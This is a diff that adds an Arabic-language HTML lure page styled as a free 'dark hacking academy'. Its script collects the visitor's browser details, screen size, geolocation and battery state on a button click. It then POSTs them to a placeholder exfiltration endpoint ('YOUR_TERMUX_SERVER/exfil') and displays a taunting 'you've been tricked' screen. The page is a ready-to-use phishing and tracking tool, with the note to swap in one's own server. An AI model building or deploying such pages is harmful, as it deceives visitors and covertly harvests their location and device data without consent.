@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جحيم الهاكرز</title>
+    <style>
+        /* أنيميشن الخلفية */
+        @keyframes matrix {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 1000px; }
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #0f0;
+            height: 100vh;
+            overflow: hidden;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
+            background-size: 100px 100px;
+            animation: matrix 10s infinite linear;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .glitch {
+            font-size: 6rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 #f00, -0.05em 0 0 #0ff;
+            animation: glitch 2s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #f00, -0.05em 0 0 #0ff; }
+            15% { text-shadow: -0.05em 0 0 #f00, 0.05em 0 0 #0ff; }
+            50% { text-shadow: 0.05em 0 0 #f00, -0.05em 0 0 #0ff; }
+            75% { text-shadow: -0.05em 0 0 #f00, 0.025em 0 0 #0ff; }
+            100% { text-shadow: 0.025em 0 0 #f00, -0.025em 0 0 #0ff; }
+        }
+        
+        .subtitle {
+            font-size: 1.5rem;
+            margin: 2rem 0;
+            color: #ff0;
+        }
+        
+        .hack-button {
+            background: linear-gradient(45deg, #f00, #800);
+            color: #fff;
+            font-size: 2rem;
+            padding: 1rem 3rem;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: inherit;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+            transition: all 0.3s;
+            margin-top: 2rem;
+        }
+        
+        .hack-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 50px #f00;
+        }
+        
+        /* شاشة النهاية */
+        #hacked-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #f00;
+        }
+        
+        .demonic-text {
+            font-size: 3rem;
+            text-shadow: 0 0 20px #f00;
+            margin-bottom: 2rem;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+        }
+        
+        .zhao-image {
+            width: 300px;
+            height: 400px;
+            border: 5px solid #f00;
+            box-shadow: 0 0 50px #f00;
+            margin: 2rem 0;
+            background: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 1.5rem;
+            text-align: center;
+        }
+        
+        .american-flag {
+            width: 300px;
+            height: 160px;
+            background: 
+                linear-gradient(to bottom, 
+                    #bd3d3d 0%, #bd3d3d 40%,
+                    #fff 40%, #fff 45%,
+                    #bd3d3d 45%, #bd3d3d 55%,
+                    #fff 55%, #fff 60%,
+                    #bd3d3d 60%, #bd3d3d 100%
+                );
+            position: relative;
+            margin-bottom: 2rem;
+        }
+        
+        .american-flag::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100px;
+            height: 100%;
+            background: #0a3161;
+        }
+    </style>
+</head>
+<body>
+    <div class="glitch">hacker_hell</div>
+    <p class="subtitle">أكاديمية الاختراق المظلم - المستوى النهائي</p>
+    <button id="hackButton" class="hack-button">بدء الاختراق المجاني</button>
+    
+    <div id="hacked-screen">
+        <div class="demonic-text">لقد تمّ خداعك بواسطة زاو فان!</div>
+        <div class="american-flag"></div>
+        <div class="zhao-image">صورة زاو فان الشيطانية</div>
+        <div class="demonic-text" style="font-size:2rem;">معلوماتك الآن في قاعدة بيانات الشيطان الإمبراطور</div>
+    </div>
+
+    <script>
+        // ========== دالة جمع البيانات ==========
+        async function collectVictimData() {
+            const data = {
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine
+            };
+            
+            // جمع الموقع الجغرافي
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => 
+                        navigator.geolocation.getCurrentPosition(resolve, reject)
+                    );
+                    data.geo = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    };
+                } catch (error) {
+                    data.geoError = error.message;
+                }
+            }
+            
+            // جمع بيانات البطارية
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: battery.level * 100,
+                        charging: battery.charging
+                    };
+                } catch (error) {
+                    data.batteryError = error.message;
+                }
+            }
+            
+            return data;
+        }
+        
+        // ========== حدث الضغط على الزر ==========
+        document.getElementById('hackButton').addEventListener('click', async function() {
+            this.textContent = 'جاري الاختراق...';
+            this.disabled = true;
+            
+            // 1. جمع بيانات الضحية
+            const victimData = await collectVictimData();
+            
+            // 2. إرسال البيانات إلى الترمكس (استبدل برابطك)
+            try {
+                await fetch('https://YOUR_TERMUX_SERVER/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(victimData)
+                });
+            } catch (error) {
+                console.error('فشل الإرسال:', error);
+            }
+            
+            // 3. عرض شاشة النهاية بعد 3 ثواني
+            setTimeout(() => {
+                document.getElementById('hacked-screen').style.display = 'flex';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
